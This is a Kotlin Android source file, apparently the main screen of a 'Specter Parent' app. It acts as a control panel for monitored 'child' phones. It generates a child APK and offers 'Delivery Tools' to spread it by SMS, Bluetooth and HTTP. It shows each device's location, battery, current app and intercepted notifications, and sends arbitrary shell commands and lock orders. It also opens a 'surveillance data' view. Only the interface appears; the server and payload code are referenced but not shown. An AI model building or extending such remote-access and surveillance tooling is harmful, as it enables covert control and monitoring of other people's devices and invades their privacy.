package com.divine.specter.parent.ui

import android.content.Intent
import android.graphics.Bitmap
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.compose.ui.window.Dialog
import com.divine.specter.parent.generator.ChildApkGenerator
import com.divine.specter.parent.server.ParentServer
import com.divine.specter.parent.service.ParentServerService
import com.divine.specter.parent.ui.theme.SpecterParentTheme
import androidx.compose.runtime.collectAsState
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : ComponentActivity() {

    private lateinit var server: ParentServer
    private lateinit var apkGenerator: ChildApkGenerator

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        server = ParentServer(this)
        apkGenerator = ChildApkGenerator(this)

        setContent {
            SpecterParentTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    ParentDashboard(
                        server = server,
                        apkGenerator = apkGenerator,
                        onStartService = { startServerService() },
                        onStopService = { stopServerService() }
                    )
                }
            }
        }
    }

    private fun startServerService() {
        Intent(this, ParentServerService::class.java).also {
            it.action = ParentServerService.ACTION_START
            startForegroundService(it)
        }
        server.start()
    }

    private fun stopServerService() {
        server.stop()
        Intent(this, ParentServerService::class.java).also {
            it.action = ParentServerService.ACTION_STOP
            startService(it)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        server.stop()
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun ParentDashboard(
    server: ParentServer,
    apkGenerator: ChildApkGenerator,
    onStartService: () -> Unit,
    onStopService: () -> Unit
) {
    val isRunning by server.isRunning.collectAsState()
    val serverUrl by server.serverUrl.collectAsState()
    val devices by server.devices.collectAsState()

    var showQrDialog by remember { mutableStateOf(false) }
    var selectedDevice by remember { mutableStateOf<ParentServer.ChildDevice?>(null) }
    var showSurveillance by remember { mutableStateOf<Pair<String, String>?>(null) }
    var showDeliveryTools by remember { mutableStateOf(false) }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            Icons.Default.Visibility,
                            contentDescription = null,
                            tint = MaterialTheme.colorScheme.primary
                        )
                        Spacer(Modifier.width(8.dp))
                        Text("Specter Parent")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.surface
                )
            )
        },
        floatingActionButton = {
            if (isRunning) {
                FloatingActionButton(
                    onClick = { showQrDialog = true },
                    containerColor = MaterialTheme.colorScheme.primary
                ) {
                    Icon(Icons.Default.QrCode, "Add Device")
                }
            }
        }
    ) { padding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp)
        ) {
            // Server Status Card
            ServerStatusCard(
                isRunning = isRunning,
                serverUrl = serverUrl,
                onToggle = { if (isRunning) onStopService() else onStartService() }
            )

            Spacer(Modifier.height(24.dp))

            // Delivery Tools Button
            if (isRunning) {
                Card(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clickable { showDeliveryTools = true },
                    colors = CardDefaults.cardColors(
                        containerColor = Color(0xFF1A1A1A)
                    ),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(16.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            Icons.Default.DeliveryDining,
                            contentDescription = null,
                            tint = Color(0xFF00FF88),
                            modifier = Modifier.size(32.dp)
                        )
                        Spacer(Modifier.width(12.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                "Delivery Tools",
                                fontWeight = FontWeight.Bold,
                                color = Color.White
                            )
                            Text(
                                "SMS, Bluetooth, HTTP distribution",
                                style = MaterialTheme.typography.bodySmall,
                                color = Color.Gray
                            )
                        }
                        Icon(
                            Icons.Default.ChevronRight,
                            contentDescription = null,
                            tint = Color.Gray
                        )
                    }
                }

                Spacer(Modifier.height(24.dp))
            }

            // Device List
            Text(
                "Connected Devices",
                style = MaterialTheme.typography.titleMedium,
                fontWeight = FontWeight.Bold
            )

            Spacer(Modifier.height(12.dp))

            if (devices.isEmpty()) {
                EmptyDevicesCard(isRunning)
            } else {
                LazyColumn(
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    items(devices.values.toList()) { device ->
                        DeviceCard(
                            device = device,
                            onClick = { selectedDevice = device },
                            onLocate = { server.locateDevice(device.id) },
                            onLock = { server.lockDevice(device.id) }
                        )
                    }
                }
            }
        }
    }

    // QR Code Dialog
    if (showQrDialog && serverUrl != null) {
        QrCodeDialog(
            serverUrl = serverUrl!!,
            apkGenerator = apkGenerator,
            onDismiss = { showQrDialog = false }
        )
    }

    // Device Detail Dialog
    selectedDevice?.let { device ->
        DeviceDetailDialog(
            device = device,
            server = server,
            onDismiss = { selectedDevice = null },
            onOpenSurveillance = { deviceId, deviceName ->
                showSurveillance = deviceId to deviceName
                selectedDevice = null
            }
        )
    }

    // Surveillance Screen
    showSurveillance?.let { (deviceId, deviceName) ->
        SurveillanceScreen(
            deviceId = deviceId,
            deviceName = deviceName,
            filesDir = androidx.compose.ui.platform.LocalContext.current.filesDir,
            onBack = { showSurveillance = null }
        )
    }

    // Delivery Tools Screen
    if (showDeliveryTools) {
        val context = androidx.compose.ui.platform.LocalContext.current
        val apkFile = java.io.File(context.filesDir, "child-debug.apk")
        DeliveryToolsScreen(
            apkFile = apkFile,
            onBack = { showDeliveryTools = false }
        )
    }
}

@Composable
fun ServerStatusCard(
    isRunning: Boolean,
    serverUrl: String?,
    onToggle: () -> Unit
) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant
        ),
        shape = RoundedCornerShape(16.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(20.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .size(12.dp)
                            .clip(CircleShape)
                            .background(if (isRunning) Color(0xFF00FF88) else Color.Gray)
                    )
                    Spacer(Modifier.width(8.dp))
                    Text(
                        if (isRunning) "Server Running" else "Server Stopped",
                        fontWeight = FontWeight.Bold
                    )
                }
                if (serverUrl != null) {
                    Spacer(Modifier.height(4.dp))
                    Text(
                        serverUrl,
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.primary
                    )
                }
            }

            Button(
                onClick = onToggle,
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (isRunning)
                        Color(0xFFEF4444) else MaterialTheme.colorScheme.primary
                )
            ) {
                Icon(
                    if (isRunning) Icons.Default.Stop else Icons.Default.PlayArrow,
                    contentDescription = null
                )
                Spacer(Modifier.width(8.dp))
                Text(if (isRunning) "Stop" else "Start")
            }
        }
    }
}

@Composable
fun EmptyDevicesCard(isRunning: Boolean) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
        )
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(32.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Icon(
                Icons.Default.DevicesOther,
                contentDescription = null,
                modifier = Modifier.size(48.dp),
                tint = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.5f)
            )
            Spacer(Modifier.height(16.dp))
            Text(
                "No devices connected",
                style = MaterialTheme.typography.bodyLarge
            )
            if (isRunning) {
                Spacer(Modifier.height(8.dp))
                Text(
                    "Tap + to generate QR code for child device",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
                )
            }
        }
    }
}

@Composable
fun DeviceCard(
    device: ParentServer.ChildDevice,
    onClick: () -> Unit,
    onLocate: () -> Unit,
    onLock: () -> Unit
) {
    val isOnline = System.currentTimeMillis() - device.lastSeen < 60000
    val dateFormat = SimpleDateFormat("HH:mm", Locale.getDefault())

    Card(
        modifier = Modifier
            .fillMaxWidth()
            .clickable(onClick = onClick),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant
        ),
        shape = RoundedCornerShape(12.dp)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(16.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                // Status indicator
                Box(
                    modifier = Modifier
                        .size(40.dp)
                        .clip(CircleShape)
                        .background(
                            if (isOnline) Color(0xFF00FF88).copy(alpha = 0.2f)
                            else Color.Gray.copy(alpha = 0.2f)
                        ),
                    contentAlignment = Alignment.Center
                ) {
                    Icon(
                        Icons.Default.PhoneAndroid,
                        contentDescription = null,
                        tint = if (isOnline) Color(0xFF00FF88) else Color.Gray
                    )
                }

                Spacer(Modifier.width(12.dp))

                Column {
                    Text(device.name, fontWeight = FontWeight.Bold)
                    Text(
                        if (isOnline) "Online" else "Last seen ${dateFormat.format(Date(device.lastSeen))}",
                        style = MaterialTheme.typography.bodySmall,
                        color = if (isOnline) Color(0xFF00FF88)
                        else MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
                    )
                    if (device.battery > 0) {
                        Text(
                            "Battery: ${device.battery}%",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
                        )
                    }
                }
            }

            Row {
                IconButton(onClick = onLocate) {
                    Icon(
                        Icons.Default.LocationOn,
                        contentDescription = "Locate",
                        tint = MaterialTheme.colorScheme.primary
                    )
                }
                IconButton(onClick = onLock) {
                    Icon(
                        Icons.Default.Lock,
                        contentDescription = "Lock",
                        tint = Color(0xFFEF4444)
                    )
                }
            }
        }
    }
}

@Composable
fun QrCodeDialog(
    serverUrl: String,
    apkGenerator: ChildApkGenerator,
    onDismiss: () -> Unit
) {
    var deviceName by remember { mutableStateOf("Child Device") }
    val qrBitmap = remember(serverUrl, deviceName) {
        apkGenerator.generateSetupQrCode(serverUrl, deviceName)
    }

    Dialog(onDismissRequest = onDismiss) {
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surface
            )
        ) {
            Column(
                modifier = Modifier.padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    "Add Child Device",
                    style = MaterialTheme.typography.titleLarge,
                    fontWeight = FontWeight.Bold
                )

                Spacer(Modifier.height(16.dp))

                OutlinedTextField(
                    value = deviceName,
                    onValueChange = { deviceName = it },
                    label = { Text("Device Name") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth()
                )

                Spacer(Modifier.height(16.dp))

                // QR Code
                Image(
                    bitmap = qrBitmap.asImageBitmap(),
                    contentDescription = "Setup QR Code",
                    modifier = Modifier
                        .size(200.dp)
                        .clip(RoundedCornerShape(8.dp))
                )

                Spacer(Modifier.height(12.dp))

                Text(
                    "Scan with child device to connect",
                    style = MaterialTheme.typography.bodySmall,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                Spacer(Modifier.height(16.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.End
                ) {
                    TextButton(onClick = onDismiss) {
                        Text("Close")
                    }
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DeviceDetailDialog(
    device: ParentServer.ChildDevice,
    server: ParentServer,
    onDismiss: () -> Unit,
    onOpenSurveillance: (String, String) -> Unit
) {
    var commandInput by remember { mutableStateOf("") }

    Dialog(onDismissRequest = onDismiss) {
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .fillMaxHeight(0.8f),
            shape = RoundedCornerShape(16.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surface
            )
        ) {
            Column(modifier = Modifier.padding(20.dp)) {
                // Header
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text(
                        device.name,
                        style = MaterialTheme.typography.titleLarge,
                        fontWeight = FontWeight.Bold
                    )
                    IconButton(onClick = onDismiss) {
                        Icon(Icons.Default.Close, "Close")
                    }
                }

                Spacer(Modifier.height(16.dp))

                // Device Info
                InfoRow("Model", device.model.ifEmpty { "Unknown" })
                InfoRow("Battery", "${device.battery}%")
                InfoRow("Screen", if (device.screenOn) "On" else "Off")
                device.currentApp?.let { InfoRow("Current App", it) }

                Spacer(Modifier.height(16.dp))

                // Location
                device.location?.let { loc ->
                    Card(
                        colors = CardDefaults.cardColors(
                            containerColor = MaterialTheme.colorScheme.surfaceVariant
                        )
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(12.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                Icons.Default.LocationOn,
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.primary
                            )
                            Spacer(Modifier.width(8.dp))
                            Text("${loc.latitude}, ${loc.longitude}")
                        }
                    }
                }

                Spacer(Modifier.height(16.dp))

                // Command Input
                Text(
                    "Send Command",
                    style = MaterialTheme.typography.titleSmall,
                    fontWeight = FontWeight.Bold
                )

                Spacer(Modifier.height(8.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    OutlinedTextField(
                        value = commandInput,
                        onValueChange = { commandInput = it },
                        placeholder = { Text("Shell command...") },
                        modifier = Modifier.weight(1f),
                        singleLine = true
                    )
                    Button(
                        onClick = {
                            if (commandInput.isNotBlank()) {
                                server.executeCommand(device.id, commandInput)
                                commandInput = ""
                            }
                        }
                    ) {
                        Icon(Icons.Default.Send, "Send")
                    }
                }

                Spacer(Modifier.height(16.dp))

                // Quick Actions
                Text(
                    "Quick Actions",
                    style = MaterialTheme.typography.titleSmall,
                    fontWeight = FontWeight.Bold
                )

                Spacer(Modifier.height(8.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    ActionButton(
                        icon = Icons.Default.LocationOn,
                        label = "Locate",
                        onClick = { server.locateDevice(device.id) },
                        modifier = Modifier.weight(1f)
                    )
                    ActionButton(
                        icon = Icons.Default.Lock,
                        label = "Lock",
                        onClick = { server.lockDevice(device.id) },
                        color = Color(0xFFEF4444),
                        modifier = Modifier.weight(1f)
                    )
                }

                Spacer(Modifier.height(8.dp))

                // Surveillance Button
                Button(
                    onClick = { onOpenSurveillance(device.id, device.name) },
                    modifier = Modifier.fillMaxWidth(),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = Color(0xFF1A1A1A),
                        contentColor = Color(0xFF00FF88)
                    ),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Icon(Icons.Default.RemoveRedEye, contentDescription = null)
                    Spacer(Modifier.width(8.dp))
                    Text("View Surveillance Data")
                    Spacer(Modifier.weight(1f))
                    Icon(Icons.Default.ChevronRight, contentDescription = null, modifier = Modifier.size(20.dp))
                }

                Spacer(Modifier.height(16.dp))

                // Recent Notifications
                if (device.notifications.isNotEmpty()) {
                    Text(
                        "Recent Notifications",
                        style = MaterialTheme.typography.titleSmall,
                        fontWeight = FontWeight.Bold
                    )

                    Spacer(Modifier.height(8.dp))

                    LazyColumn(
                        modifier = Modifier.weight(1f),
                        verticalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        items(device.notifications.takeLast(10).reversed()) { notif ->
                            NotificationItem(notif)
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun InfoRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(
            label,
            color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
        )
        Text(value, fontWeight = FontWeight.Medium)
    }
}

@Composable
fun ActionButton(
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    label: String,
    onClick: () -> Unit,
    color: Color = MaterialTheme.colorScheme.primary,
    modifier: Modifier = Modifier
) {
    OutlinedButton(
        onClick = onClick,
        modifier = modifier,
        colors = ButtonDefaults.outlinedButtonColors(contentColor = color)
    ) {
        Icon(icon, contentDescription = null, modifier = Modifier.size(18.dp))
        Spacer(Modifier.width(4.dp))
        Text(label, fontSize = 12.sp)
    }
}

@Composable
fun NotificationItem(notif: ParentServer.NotificationData) {
    Card(
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
        )
    ) {
        Column(modifier = Modifier.padding(12.dp)) {
            Text(
                notif.appName,
                style = MaterialTheme.typography.labelSmall,
                color = MaterialTheme.colorScheme.primary
            )
            notif.title?.let {
                Text(it, fontWeight = FontWeight.Medium, fontSize = 14.sp)
            }
            notif.text?.let {
                Text(
                    it,
                    fontSize = 12.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.7f)
                )
            }
        }
    }
}
